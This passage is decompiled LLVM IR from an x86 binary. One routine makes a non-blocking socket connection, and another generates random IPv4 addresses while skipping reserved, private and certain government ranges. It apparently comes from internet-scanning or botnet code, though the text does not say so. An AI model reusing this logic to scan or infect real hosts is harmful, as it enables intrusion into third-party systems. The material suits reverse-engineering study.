  %v1_804dd19 = load i32, i32* @ebx, align 4
  %v2_804dd19 = add i32 %v1_804dd19, 4
  %v3_804dd19 = inttoptr i32 %v2_804dd19 to i32*
  store i32 %v4_804dd11, i32* %v3_804dd19, align 4
  %v8_804dd1c = icmp eq i32 %v4_804dd11, -1
  br i1 %v8_804dd1c, label %dec_label_pc_804dd93, label %dec_label_pc_804dd1f

dec_label_pc_804dd1f:                             ; preds = %dec_label_pc_804dd0a
  %v0_804dd21 = load i32, i32* @ebx, align 4
  %v1_804dd21 = add i32 %v0_804dd21, 28
  store i32 %v1_804dd21, i32* @eax, align 4
  %v1_804dd29 = add i32 %v0_804dd21, 24
  %v2_804dd29 = inttoptr i32 %v1_804dd29 to i32*
  store i32 0, i32* %v2_804dd29, align 4
  %v0_804dd30 = load i32, i32* @eax, align 4
  %v2_804dd31 = call i32 @function_8051050(i32 %v0_804dd30, i32 256)
  %v0_804dd39 = load i32, i32* @ebx, align 4
  %v1_804dd39 = add i32 %v0_804dd39, 4
  %v2_804dd39 = inttoptr i32 %v1_804dd39 to i32*
  %v3_804dd39 = load i32, i32* %v2_804dd39, align 4
  %v3_804dd41 = call i32 @function_805144d(i32 %v3_804dd39, i32 3, i32 0)
  %v0_804dd49 = load i32, i32* @ebx, align 4
  %v1_804dd49 = add i32 %v0_804dd49, 4
  %v2_804dd49 = inttoptr i32 %v1_804dd49 to i32*
  %v3_804dd49 = load i32, i32* %v2_804dd49, align 4
  %v12_804dd4c = or i32 %v3_804dd41, 2048
  %v3_804dd53 = call i32 @function_805144d(i32 %v3_804dd49, i32 4, i32 %v12_804dd4c)
  %v0_804dd58 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804dd6e = load i32, i32* @global_var_80556d0.9, align 16
  %v2_804dd73 = add i32 %v0_804dd58, 8
  %v3_804dd73 = inttoptr i32 %v2_804dd73 to i32*
  store i32 %v0_804dd6e, i32* %v3_804dd73, align 4
  %v2_804dd76 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804dd7d = load i32, i32* @ebx, align 4
  %v1_804dd7d = add i32 %v0_804dd7d, 4
  %v2_804dd7d = inttoptr i32 %v1_804dd7d to i32*
  %v3_804dd7d = load i32, i32* %v2_804dd7d, align 4
  store i32 %v3_804dd7d, i32* %edx.global-to-local, align 4
  %v1_804dd80 = add i32 %v0_804dd7d, 12
  %v2_804dd80 = inttoptr i32 %v1_804dd80 to i32*
  store i32 1, i32* %v2_804dd80, align 4
  %v0_804dd8a = load i32, i32* %edx.global-to-local, align 4
  %v3_804dd8b = call i32 @function_8051aec(i32 %v0_804dd8a, i32 %v2_804dd76, i32 16)
  br label %dec_label_pc_804dd93

dec_label_pc_804dd93:                             ; preds = %dec_label_pc_804dd0a, %dec_label_pc_804dd1f
  %v0_804dd97 = phi i32 [ %v3_804dd8b, %dec_label_pc_804dd1f ], [ 0, %dec_label_pc_804dd0a ]
  store i32 %v0_804dcd0, i32* @ebx, align 4
  ret i32 %v0_804dd97

; uselistorder directives
  uselistorder i32 %v3_804dcf6, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804dd93, { 1, 0 }
  uselistorder label %dec_label_pc_804dd0a, { 1, 0 }
}

define i32 @function_804e275() local_unnamed_addr {
dec_label_pc_804e275:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804f47b, %dec_label_pc_804e275
  %v0_804e275 = load i32, i32* @global_var_80556d0.9, align 16
  store i32 %v0_804e275, i32* @esi, align 4
  %v0_804e27b = load i32, i32* @esp, align 4
  %v1_804e27b = add i32 %v0_804e27b, 28
  %v2_804e27b = inttoptr i32 %v1_804e27b to i32*
  %v3_804e27b = load i32, i32* %v2_804e27b, align 4
  %v15_804e27b = icmp eq i32 %v3_804e27b, %v0_804e275
  br i1 %v15_804e27b, label %dec_label_pc_804f1b2, label %dec_label_pc_804e285

dec_label_pc_804e285:                             ; preds = %.loopexit
  %v1_804e285 = add i32 %v0_804e27b, 1932
  %v2_804e285 = inttoptr i32 %v1_804e285 to i32*
  store i32 0, i32* %v2_804e285, align 4
  %v0_804e290.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e290

dec_label_pc_804e290:                             ; preds = %dec_label_pc_804f0c3, %dec_label_pc_804e285
  %v0_804e290 = phi i32 [ %v1_804f1a0, %dec_label_pc_804f0c3 ], [ %v0_804e290.pre, %dec_label_pc_804e285 ]
  %v1_804e290 = add i32 %v0_804e290, 1892
  %v2_804e290 = inttoptr i32 %v1_804e290 to i32*
  store i32 0, i32* %v2_804e290, align 4
  %v0_804e29b = load i32, i32* @esp, align 4
  %v1_804e29b = add i32 %v0_804e29b, 1896
  %v2_804e29b = inttoptr i32 %v1_804e29b to i32*
  store i32 0, i32* %v2_804e29b, align 4
  %v0_804e2a6 = load i32, i32* @esp, align 4
  %v1_804e2a6 = add i32 %v0_804e2a6, 1900
  %v2_804e2a6 = inttoptr i32 %v1_804e2a6 to i32*
  store i32 0, i32* %v2_804e2a6, align 4
  %v0_804e2b1 = load i32, i32* @esp, align 4
  %v1_804e2b1 = add i32 %v0_804e2b1, 1904
  %v2_804e2b1 = inttoptr i32 %v1_804e2b1 to i32*
  store i32 0, i32* %v2_804e2b1, align 4
  %v1_804e2bc = call i32 @function_804d5c0(i32 ptrtoint (i32* @0 to i32))
  %v2_804e2bc = trunc i32 %v1_804e2bc to i16
  store i16 %v2_804e2bc, i16* bitcast (i32* @global_var_80556a4.10 to i16*), align 4
  %v0_804e2c7 = load i32, i32* @global_var_80556fc.11, align 4
  store i32 %v0_804e2c7, i32* %eax.global-to-local, align 4
  store i32 %v0_804e2c7, i32* @global_var_80556ac.12, align 4
  br label %dec_label_pc_804e2d1

dec_label_pc_804e2d1:                             ; preds = %dec_label_pc_804f077, %dec_label_pc_80502fe, %dec_label_pc_804ea76, %dec_label_pc_804e74c, %dec_label_pc_804e6c3, %switch.early.test, %switch.early.test, %switch.early.test, %dec_label_pc_804e420, %dec_label_pc_804efb9, %dec_label_pc_804efb9, %dec_label_pc_804efb9, %dec_label_pc_804efb9, %dec_label_pc_804efb9, %dec_label_pc_804efb9, %dec_label_pc_804efb9, %dec_label_pc_804efb9, %dec_label_pc_804efb9, %dec_label_pc_804efb9, %dec_label_pc_804efb9, %dec_label_pc_805040c, %dec_label_pc_8050263, %dec_label_pc_804eea7, %dec_label_pc_804ee90, %dec_label_pc_804ee77, %dec_label_pc_804ee87, %dec_label_pc_804ee60, %dec_label_pc_804ee2b, %dec_label_pc_804ee34, %dec_label_pc_8050863, %dec_label_pc_804ee1b, %dec_label_pc_804ec2f, %dec_label_pc_804ec1f, %dec_label_pc_804ec09, %dec_label_pc_804ebf1, %dec_label_pc_804ebd9, %dec_label_pc_804ebc9, %dec_label_pc_804ebb9, %dec_label_pc_804eb7b, %dec_label_pc_804ecb8, %dec_label_pc_804ecc1, %dec_label_pc_804ec5d, %dec_label_pc_80506b9, %dec_label_pc_80506a2, %dec_label_pc_804ecd8, %dec_label_pc_805066b, %dec_label_pc_804eb6b, %dec_label_pc_804eb62, %dec_label_pc_8050628, %dec_label_pc_8050612, %dec_label_pc_804eb32, %dec_label_pc_80505dd, %dec_label_pc_804eaee, %dec_label_pc_804eaf7, %dec_label_pc_804eade, %dec_label_pc_804ea9a, %dec_label_pc_805055e, %dec_label_pc_8050515, %dec_label_pc_80504fe, %dec_label_pc_80504c9, %dec_label_pc_804e70a, %dec_label_pc_8050439, %dec_label_pc_8050422, %dec_label_pc_80503f6, %dec_label_pc_80503df, %dec_label_pc_804ef0c, %dec_label_pc_804ef15, %dec_label_pc_804eeb7, %dec_label_pc_804eee3, %dec_label_pc_804eeec, %dec_label_pc_805034c, %dec_label_pc_804ef2c, %dec_label_pc_8050315, %dec_label_pc_80502df, %dec_label_pc_804f002, %dec_label_pc_80502a8, %dec_label_pc_8050291, %dec_label_pc_805027a, %dec_label_pc_805024c, %dec_label_pc_805001f, %dec_label_pc_804f0b1, %dec_label_pc_804f03b, %dec_label_pc_804efa6, %dec_label_pc_804ef7a, %dec_label_pc_804ef45, %dec_label_pc_804eece, %dec_label_pc_804ee4b, %dec_label_pc_804ed22, %dec_label_pc_804ec98, %dec_label_pc_804ec83, %dec_label_pc_804ec71, %dec_label_pc_804eb9a, %dec_label_pc_804eb0e, %dec_label_pc_804eab9, %dec_label_pc_804ea32, %dec_label_pc_804ea32, %dec_label_pc_804e9c0, %dec_label_pc_804e9c0, %dec_label_pc_804e984, %dec_label_pc_804e95f, %dec_label_pc_804e942, %dec_label_pc_804e91d, %dec_label_pc_804e908, %dec_label_pc_804e8d4, %dec_label_pc_804e8b6, %dec_label_pc_804e89e, %dec_label_pc_804e872, %dec_label_pc_804e842, %dec_label_pc_804e824, %dec_label_pc_804e80f, %dec_label_pc_804e7fa, %dec_label_pc_804e7ec, %dec_label_pc_804e7de, %dec_label_pc_804e7ce, %dec_label_pc_804e79a, %dec_label_pc_804e73e, %dec_label_pc_804e6b5, %dec_label_pc_804e5a8, %dec_label_pc_804e531, %dec_label_pc_804e45d, %dec_label_pc_804e3f8, %dec_label_pc_804e3f8, %dec_label_pc_804e3f8, %dec_label_pc_804e3c0, %dec_label_pc_804e35a, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2ef, %dec_label_pc_804e2d1, %dec_label_pc_804e2d1, %dec_label_pc_80508b1, %dec_label_pc_8050855, %dec_label_pc_8050847, %dec_label_pc_805082e, %dec_label_pc_8050815, %dec_label_pc_8050807, %dec_label_pc_80507d8, %dec_label_pc_80504e0, %dec_label_pc_80504b0, %dec_label_pc_8050011, %dec_label_pc_8050003, %dec_label_pc_80506d0, %dec_label_pc_8050575, %dec_label_pc_8050550, %dec_label_pc_8050537, %dec_label_pc_80504ee, %dec_label_pc_80504a0, %dec_label_pc_8050490, %dec_label_pc_8050474, %dec_label_pc_805045b, %dec_label_pc_8050036, %dec_label_pc_804f0a6, %dec_label_pc_804f06e, %dec_label_pc_804eff9, %dec_label_pc_804efdc, %dec_label_pc_804ef99, %dec_label_pc_804ef6d, %dec_label_pc_804ee03, %dec_label_pc_804edef, %dec_label_pc_804edda, %dec_label_pc_804edb3, %dec_label_pc_804ed9d, %dec_label_pc_804ed87, %dec_label_pc_804ed6e, %dec_label_pc_804ed5e, %dec_label_pc_804ed4e, %dec_label_pc_804ed3e, %dec_label_pc_804ec50, %dec_label_pc_804e9a8, %dec_label_pc_804e8f0, %dec_label_pc_804e891, %dec_label_pc_804e7b6, %dec_label_pc_804e69b, %dec_label_pc_804e66a, %dec_label_pc_804e643, %dec_label_pc_804e62b, %dec_label_pc_804e613, %dec_label_pc_804e603, %dec_label_pc_804e5e9, %dec_label_pc_804e5d2, %dec_label_pc_804e57d, %dec_label_pc_804e572, %dec_label_pc_804e55b, %dec_label_pc_804e51f, %dec_label_pc_804e505, %dec_label_pc_804e4f4, %dec_label_pc_804e4da, %dec_label_pc_804e4b1, %dec_label_pc_804e4a6, %dec_label_pc_804e484, %dec_label_pc_804e452, %dec_label_pc_804e3b5, %dec_label_pc_804e39b, %dec_label_pc_804e381, %dec_label_pc_804e351, %dec_label_pc_804ea8f, %dec_label_pc_804ea6d, %dec_label_pc_804ea5b, %dec_label_pc_804ea20, %dec_label_pc_804e9fe, %dec_label_pc_804e9e6, %dec_label_pc_804e9d6, %dec_label_pc_804e290
  %v1_804e2d1 = call i32 @function_804d5c0(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e2d1, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v1_804e2d1, 65536
  %v1_804e2d6 = sdiv i32 %sext, 65536
  %v2_804e2dc = urem i32 %v1_804e2d1, 256
  %v3_804e2dc = load i32, i32* @ecx, align 4
  %v4_804e2dc = and i32 %v3_804e2dc, -256
  %v5_804e2dc = or i32 %v4_804e2dc, %v2_804e2dc
  store i32 %v5_804e2dc, i32* %ecx.global-to-local, align 4
  %v2_804e2de = udiv i32 %v1_804e2d6, 256
  store i32 %v2_804e2de, i32* @ebx, align 4
  %v2_804e2e1 = udiv i32 %v1_804e2d6, 65536
  %v4_804e2e1 = trunc i32 %v2_804e2e1 to i8
  store i32 %v2_804e2e1, i32* %edx.global-to-local, align 4
  %v2_804e2e4 = udiv i32 %v1_804e2d6, 16777216
  store i32 %v2_804e2e4, i32* @edi, align 4
  %v2_804e2e7 = trunc i32 %v1_804e2d1 to i8
  switch i8 %v2_804e2e7, label %dec_label_pc_804e2ef [
    i8 127, label %dec_label_pc_804e2d1
    i8 0, label %dec_label_pc_804e2d1
  ]

dec_label_pc_804e2ef:                             ; preds = %dec_label_pc_804e2d1
  switch i8 %v2_804e2e7, label %dec_label_pc_804e343 [
    i8 3, label %dec_label_pc_804e2d1
    i8 15, label %dec_label_pc_804e2d1
    i8 56, label %dec_label_pc_804e2d1
    i8 10, label %dec_label_pc_804e2d1
    i8 25, label %dec_label_pc_804e2d1
    i8 49, label %dec_label_pc_804e2d1
    i8 50, label %dec_label_pc_804e2d1
    i8 -119, label %dec_label_pc_804e2d1
    i8 6, label %dec_label_pc_804e2d1
    i8 7, label %dec_label_pc_804e2d1
    i8 11, label %dec_label_pc_804e2d1
    i8 21, label %dec_label_pc_804e2d1
    i8 22, label %dec_label_pc_804e2d1
    i8 26, label %dec_label_pc_804e2d1
    i8 28, label %dec_label_pc_804e2d1
    i8 29, label %dec_label_pc_804e2d1
    i8 30, label %dec_label_pc_804e2d1
    i8 33, label %dec_label_pc_804e2d1
    i8 55, label %dec_label_pc_804e2d1
    i8 -42, label %dec_label_pc_804e2d1
    i8 -41, label %dec_label_pc_804e2d1
  ]

dec_label_pc_804e343:                             ; preds = %dec_label_pc_804e2ef
  %v9_804e343 = icmp eq i8 %v2_804e2e7, -64
  %v1_804e345 = zext i1 %v9_804e343 to i8
  %v2_804e345 = load i32, i32* @esp, align 4
  %v3_804e345 = add i32 %v2_804e345, 99
  %v4_804e345 = inttoptr i32 %v3_804e345 to i8*
  store i8 %v1_804e345, i8* %v4_804e345, align 1
  %v0_804e34a = load i32, i32* @esp, align 4
  %v1_804e34a = add i32 %v0_804e34a, 99
  %v2_804e34a = inttoptr i32 %v1_804e34a to i8*
  %v3_804e34a = load i8, i8* %v2_804e34a, align 1
  %v4_804e34a = icmp eq i8 %v3_804e34a, 0
  br i1 %v4_804e34a, label %dec_label_pc_804e35a, label %dec_label_pc_804e351

dec_label_pc_804e351:                             ; preds = %dec_label_pc_804e343
  %v0_804e351 = load i32, i32* @ebx, align 4
  %v1_804e351 = trunc i32 %v0_804e351 to i8
  %v11_804e351 = icmp eq i8 %v1_804e351, -88
  br i1 %v11_804e351, label %dec_label_pc_804e2d1, label %dec_label_pc_804e35a

dec_label_pc_804e35a:                             ; preds = %dec_label_pc_804e351, %dec_label_pc_804e343
  %v0_804e35a = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e35a = trunc i32 %v0_804e35a to i8
  %v11_804e35a = icmp eq i8 %v1_804e35a, -110
  %v1_804e35d = zext i1 %v11_804e35a to i8
  %v3_804e35d = add i32 %v0_804e34a, 98
  %v4_804e35d = inttoptr i32 %v3_804e35d to i8*
  store i8 %v1_804e35d, i8* %v4_804e35d, align 1
  %v0_804e362 = load i32, i32* @esp, align 4
  %v1_804e362 = add i32 %v0_804e362, 98
  %v2_804e362 = inttoptr i32 %v1_804e362 to i8*
  %v3_804e362 = load i8, i8* %v2_804e362, align 1
  %v4_804e362 = icmp ne i8 %v3_804e362, 0
  %v0_804e372.pre = load i32, i32* @ebx, align 4
  %v1_804e369 = trunc i32 %v0_804e372.pre to i8
  %v10_804e369 = icmp eq i8 %v1_804e369, 17
  %or.cond = and i1 %v4_804e362, %v10_804e369
  br i1 %or.cond, label %dec_label_pc_804e2d1, label %dec_label_pc_804e372

dec_label_pc_804e372:                             ; preds = %dec_label_pc_804e35a
  %v7_804e372 = icmp eq i8 %v1_804e369, 80
  %v1_804e375 = zext i1 %v7_804e372 to i8
  %v3_804e375 = add i32 %v0_804e362, 97
  %v4_804e375 = inttoptr i32 %v3_804e375 to i8*
  store i8 %v1_804e375, i8* %v4_804e375, align 1
  %v0_804e37a = load i32, i32* @esp, align 4
  %v1_804e37a = add i32 %v0_804e37a, 98
  %v2_804e37a = inttoptr i32 %v1_804e37a to i8*
  %v3_804e37a = load i8, i8* %v2_804e37a, align 1
  %v4_804e37a = icmp eq i8 %v3_804e37a, 0
  br i1 %v4_804e37a, label %dec_label_pc_804e38c, label %dec_label_pc_804e381

dec_label_pc_804e381:                             ; preds = %dec_label_pc_804e372
  %v1_804e381 = add i32 %v0_804e37a, 97
  %v2_804e381 = inttoptr i32 %v1_804e381 to i8*
  %v3_804e381 = load i8, i8* %v2_804e381, align 1
  %v4_804e381 = icmp eq i8 %v3_804e381, 0
  %v1_804e386 = icmp eq i1 %v4_804e381, false
  br i1 %v1_804e386, label %dec_label_pc_804e2d1, label %dec_label_pc_804e38c

dec_label_pc_804e38c:                             ; preds = %dec_label_pc_804e381, %dec_label_pc_804e372
  %v0_804e38c = load i32, i32* @ebx, align 4
  %v1_804e38c = trunc i32 %v0_804e38c to i8
  %v10_804e38c = icmp eq i8 %v1_804e38c, 98
  %v1_804e38f = zext i1 %v10_804e38c to i8
  %v3_804e38f = add i32 %v0_804e37a, 96
  %v4_804e38f = inttoptr i32 %v3_804e38f to i8*
  store i8 %v1_804e38f, i8* %v4_804e38f, align 1
  %v0_804e394 = load i32, i32* @esp, align 4
  %v1_804e394 = add i32 %v0_804e394, 98
  %v2_804e394 = inttoptr i32 %v1_804e394 to i8*
  %v3_804e394 = load i8, i8* %v2_804e394, align 1
  %v4_804e394 = icmp eq i8 %v3_804e394, 0
  br i1 %v4_804e394, label %dec_label_pc_804e3a6, label %dec_label_pc_804e39b

dec_label_pc_804e39b:                             ; preds = %dec_label_pc_804e38c
  %v1_804e39b = add i32 %v0_804e394, 96
  %v2_804e39b = inttoptr i32 %v1_804e39b to i8*
  %v3_804e39b = load i8, i8* %v2_804e39b, align 1
  %v4_804e39b = icmp eq i8 %v3_804e39b, 0
  %v1_804e3a0 = icmp eq i1 %v4_804e39b, false
  br i1 %v1_804e3a0, label %dec_label_pc_804e2d1, label %dec_label_pc_804e3a6

dec_label_pc_804e3a6:                             ; preds = %dec_label_pc_804e39b, %dec_label_pc_804e38c
  %v0_804e3a6 = load i32, i32* @ebx, align 4
  %v1_804e3a6 = trunc i32 %v0_804e3a6 to i8
  %v11_804e3a6 = icmp eq i8 %v1_804e3a6, -102
  %v1_804e3a9 = zext i1 %v11_804e3a6 to i8
  %v3_804e3a9 = add i32 %v0_804e394, 95
  %v4_804e3a9 = inttoptr i32 %v3_804e3a9 to i8*
  store i8 %v1_804e3a9, i8* %v4_804e3a9, align 1
  %v0_804e3ae = load i32, i32* @esp, align 4
  %v1_804e3ae = add i32 %v0_804e3ae, 98
  %v2_804e3ae = inttoptr i32 %v1_804e3ae to i8*
  %v3_804e3ae = load i8, i8* %v2_804e3ae, align 1
  %v4_804e3ae = icmp eq i8 %v3_804e3ae, 0
  br i1 %v4_804e3ae, label %dec_label_pc_804e3c0, label %dec_label_pc_804e3b5

dec_label_pc_804e3b5:                             ; preds = %dec_label_pc_804e3a6
  %v1_804e3b5 = add i32 %v0_804e3ae, 95
  %v2_804e3b5 = inttoptr i32 %v1_804e3b5 to i8*
  %v3_804e3b5 = load i8, i8* %v2_804e3b5, align 1
  %v4_804e3b5 = icmp eq i8 %v3_804e3b5, 0
  %v1_804e3ba = icmp eq i1 %v4_804e3b5, false
  br i1 %v1_804e3ba, label %dec_label_pc_804e2d1, label %dec_label_pc_804e3c0

dec_label_pc_804e3c0:                             ; preds = %dec_label_pc_804e3b5, %dec_label_pc_804e3a6
  %v0_804e3c0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e3c0 = trunc i32 %v0_804e3c0 to i8
  %v11_804e3c0 = icmp eq i8 %v1_804e3c0, -109
  %v1_804e3c3 = zext i1 %v11_804e3c0 to i8
  %v3_804e3c3 = add i32 %v0_804e3ae, 94
  %v4_804e3c3 = inttoptr i32 %v3_804e3c3 to i8*
  store i8 %v1_804e3c3, i8* %v4_804e3c3, align 1
  %v0_804e3c8 = load i32, i32* @esp, align 4
  %v1_804e3c8 = add i32 %v0_804e3c8, 94
  %v2_804e3c8 = inttoptr i32 %v1_804e3c8 to i8*
  %v3_804e3c8 = load i8, i8* %v2_804e3c8, align 1
  %v4_804e3c8 = icmp ne i8 %v3_804e3c8, 0
  %v0_804e3d8.pre = load i32, i32* @ebx, align 4
  %v1_804e3cf = trunc i32 %v0_804e3d8.pre to i8
  %v11_804e3cf = icmp eq i8 %v1_804e3cf, -97
  %or.cond168 = and i1 %v4_804e3c8, %v11_804e3cf
  br i1 %or.cond168, label %dec_label_pc_804e2d1, label %dec_label_pc_804e3d8

dec_label_pc_804e3d8:                             ; preds = %dec_label_pc_804e3c0
  %v10_804e3d8 = icmp eq i8 %v1_804e3cf, 114
  %v1_804e3db = zext i1 %v10_804e3d8 to i8
  %v3_804e3db = add i32 %v0_804e3c8, 93
  %v4_804e3db = inttoptr i32 %v3_804e3db to i8*
  store i8 %v1_804e3db, i8* %v4_804e3db, align 1
  %v0_804e3e0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e3e0 = trunc i32 %v0_804e3e0 to i8
  %v11_804e3e0 = icmp eq i8 %v1_804e3e0, -108
  %v0_80504ee = load i32, i32* @esp, align 4
  br i1 %v11_804e3e0, label %dec_label_pc_80504ee, label %dec_label_pc_804e3e9

dec_label_pc_804e3e9:                             ; preds = %dec_label_pc_804e3d8, %dec_label_pc_80504ee
  %v11_804e3e9 = icmp eq i8 %v1_804e3e0, -106
  %v1_804e3ec = zext i1 %v11_804e3e9 to i8
  %v3_804e3ec = add i32 %v0_80504ee, 92
  %v4_804e3ec = inttoptr i32 %v3_804e3ec to i8*
  store i8 %v1_804e3ec, i8* %v4_804e3ec, align 1
  %v0_804e3f1 = load i32, i32* @esp, align 4
  %v1_804e3f1 = add i32 %v0_804e3f1, 92
  %v2_804e3f1 = inttoptr i32 %v1_804e3f1 to i8*
  %v3_804e3f1 = load i8, i8* %v2_804e3f1, align 1
  %v4_804e3f1 = icmp eq i8 %v3_804e3f1, 0
  %v0_804e413.pre = load i32, i32* @ebx, align 4
  %.pre = trunc i32 %v0_804e413.pre to i8
  br i1 %v4_804e3f1, label %dec_label_pc_804e413, label %dec_label_pc_804e3f8

dec_label_pc_804e3f8:                             ; preds = %dec_label_pc_804e3e9
  switch i8 %.pre, label %dec_label_pc_804e413 [
    i8 125, label %dec_label_pc_804e2d1
    i8 -123, label %dec_label_pc_804e2d1
    i8 -112, label %dec_label_pc_804e2d1
  ]

dec_label_pc_804e413:                             ; preds = %dec_label_pc_804e3e9, %dec_label_pc_804e3f8
  %v11_804e413 = icmp eq i8 %.pre, -107
  %v1_804e416 = zext i1 %v11_804e413 to i32
  %v4_804e416 = and i32 %v1_804e2d6, -256
  %v5_804e416 = or i32 %v1_804e416, %v4_804e416
  store i32 %v5_804e416, i32* %eax.global-to-local, align 4
  %v3_804e419 = load i8, i8* %v2_804e3f1, align 1
  %v4_804e419 = icmp eq i8 %v3_804e419, 0
  br i1 %v4_804e419, label %dec_label_pc_804e443, label %dec_label_pc_804e420

dec_label_pc_804e420:                             ; preds = %dec_label_pc_804e413
  %v4_804e420 = icmp eq i1 %v11_804e413, false
  %v1_804e422 = icmp eq i1 %v4_804e420, false
  br i1 %v1_804e422, label %dec_label_pc_804e2d1, label %switch.early.test

switch.early.test:                                ; preds = %dec_label_pc_804e420
  switch i8 %.pre, label %dec_label_pc_804e443 [
    i8 -66, label %dec_label_pc_804e2d1
    i8 -72, label %dec_label_pc_804e2d1
    i8 -99, label %dec_label_pc_804e2d1
  ]

dec_label_pc_804e443:                             ; preds = %switch.early.test, %dec_label_pc_804e413
  %v11_804e443 = icmp eq i8 %.pre, -60
  %v1_804e446 = zext i1 %v11_804e443 to i8
  %v3_804e446 = add i32 %v0_804e3f1, 91
  %v4_804e446 = inttoptr i32 %v3_804e446 to i8*
  store i8 %v1_804e446, i8* %v4_804e446, align 1
  %v0_804e44b = load i32, i32* @esp, align 4
  %v1_804e44b = add i32 %v0_804e44b, 92
  %v2_804e44b = inttoptr i32 %v1_804e44b to i8*
  %v3_804e44b = load i8, i8* %v2_804e44b, align 1
  %v4_804e44b = icmp eq i8 %v3_804e44b, 0
  br i1 %v4_804e44b, label %dec_label_pc_804e45d, label %dec_label_pc_804e452

dec_label_pc_804e452:                             ; preds = %dec_label_pc_804e443
  %v1_804e452 = add i32 %v0_804e44b, 91
  %v2_804e452 = inttoptr i32 %v1_804e452 to i8*
  %v3_804e452 = load i8, i8* %v2_804e452, align 1
  %v4_804e452 = icmp eq i8 %v3_804e452, 0
  %v1_804e457 = icmp eq i1 %v4_804e452, false
  br i1 %v1_804e457, label %dec_label_pc_804e2d1, label %dec_label_pc_804e45d

dec_label_pc_804e45d:                             ; preds = %dec_label_pc_804e452, %dec_label_pc_804e443
  %v0_804e45d = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e45d = trunc i32 %v0_804e45d to i8
  %v11_804e45d = icmp eq i8 %v1_804e45d, -104
  %v1_804e460 = zext i1 %v11_804e45d to i8
  %v3_804e460 = add i32 %v0_804e44b, 90
  %v4_804e460 = inttoptr i32 %v3_804e460 to i8*
  store i8 %v1_804e460, i8* %v4_804e460, align 1
  %v0_804e465 = load i32, i32* @esp, align 4
  %v1_804e465 = add i32 %v0_804e465, 90
  %v2_804e465 = inttoptr i32 %v1_804e465 to i8*
  %v3_804e465 = load i8, i8* %v2_804e465, align 1
  %v4_804e465 = icmp ne i8 %v3_804e465, 0
  %v0_804e475.pre = load i32, i32* @ebx, align 4
  %v1_804e46c = trunc i32 %v0_804e475.pre to i8
  %v10_804e46c = icmp eq i8 %v1_804e46c, 82
  %or.cond172 = and i1 %v4_804e465, %v10_804e46c
  br i1 %or.cond172, label %dec_label_pc_804e2d1, label %dec_label_pc_804e475

dec_label_pc_804e475:                             ; preds = %dec_label_pc_804e45d
  %v11_804e475 = icmp eq i8 %v1_804e46c, -27
  %v1_804e478 = zext i1 %v11_804e475 to i8
  %v3_804e478 = add i32 %v0_804e465, 89
  %v4_804e478 = inttoptr i32 %v3_804e478 to i8*
  store i8 %v1_804e478, i8* %v4_804e478, align 1
  %v0_804e47d = load i32, i32* @esp, align 4
  %v1_804e47d = add i32 %v0_804e47d, 90
  %v2_804e47d = inttoptr i32 %v1_804e47d to i8*
  %v3_804e47d = load i8, i8* %v2_804e47d, align 1
  %v4_804e47d = icmp eq i8 %v3_804e47d, 0
  br i1 %v4_804e47d, label %dec_label_pc_804e48f, label %dec_label_pc_804e484

dec_label_pc_804e484:                             ; preds = %dec_label_pc_804e475
  %v1_804e484 = add i32 %v0_804e47d, 89
  %v2_804e484 = inttoptr i32 %v1_804e484 to i8*
  %v3_804e484 = load i8, i8* %v2_804e484, align 1
  %v4_804e484 = icmp eq i8 %v3_804e484, 0
  %v1_804e489 = icmp eq i1 %v4_804e484, false
  br i1 %v1_804e489, label %dec_label_pc_804e2d1, label %dec_label_pc_804e48f

dec_label_pc_804e48f:                             ; preds = %dec_label_pc_804e484, %dec_label_pc_804e475
  %v0_804e48f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e48f = trunc i32 %v0_804e48f to i8
  %v11_804e48f = icmp eq i8 %v1_804e48f, -99
  %v1_804e492 = zext i1 %v11_804e48f to i8
  %v3_804e492 = add i32 %v0_804e47d, 88
  %v4_804e492 = inttoptr i32 %v3_804e492 to i8*
  store i8 %v1_804e492, i8* %v4_804e492, align 1
  %v0_804e497 = load i32, i32* @ebx, align 4
  %v1_804e497 = trunc i32 %v0_804e497 to i8
  %v11_804e497 = icmp eq i8 %v1_804e497, -54
  %v1_804e49a = zext i1 %v11_804e497 to i8
  %v2_804e49a = load i32, i32* @esp, align 4
  %v3_804e49a = add i32 %v2_804e49a, 87
  %v4_804e49a = inttoptr i32 %v3_804e49a to i8*
  store i8 %v1_804e49a, i8* %v4_804e49a, align 1
  %v0_804e49f = load i32, i32* @esp, align 4
  %v1_804e49f = add i32 %v0_804e49f, 88
  %v2_804e49f = inttoptr i32 %v1_804e49f to i8*
  %v3_804e49f = load i8, i8* %v2_804e49f, align 1
  %v4_804e49f = icmp eq i8 %v3_804e49f, 0
  br i1 %v4_804e49f, label %dec_label_pc_804e4ba, label %dec_label_pc_804e4a6

dec_label_pc_804e4a6:                             ; preds = %dec_label_pc_804e48f
  %v1_804e4a6 = add i32 %v0_804e49f, 87
  %v2_804e4a6 = inttoptr i32 %v1_804e4a6 to i8*
  %v3_804e4a6 = load i8, i8* %v2_804e4a6, align 1
  %v4_804e4a6 = icmp eq i8 %v3_804e4a6, 0
  %v1_804e4ab = icmp eq i1 %v4_804e4a6, false
